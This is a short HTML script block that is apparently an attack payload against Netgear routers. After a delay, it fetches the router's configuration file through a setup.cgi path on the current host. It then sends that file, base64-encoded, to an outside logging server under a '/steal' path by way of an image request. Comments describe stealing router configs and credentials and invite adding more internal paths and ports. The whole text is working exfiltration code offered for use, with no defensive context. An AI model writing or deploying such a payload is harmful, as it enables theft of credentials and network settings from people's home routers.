<script>
setTimeout(() => {
  // Example: steal router config, credentials, whatever is there
  fetch('http://' + location.hostname + '/setup.cgi?next_file=netgear.cfg')
    .then(r => r.text())
    .then(cfg => {
      new Image().src = 'https://your-log-server.com/steal?domain=' + encodeURIComponent(location.hostname) + '&data=' + btoa(cfg);
    })
    .catch(() => {});

  // Add as many internal paths/ports as you want here
}, 25000);
</script>
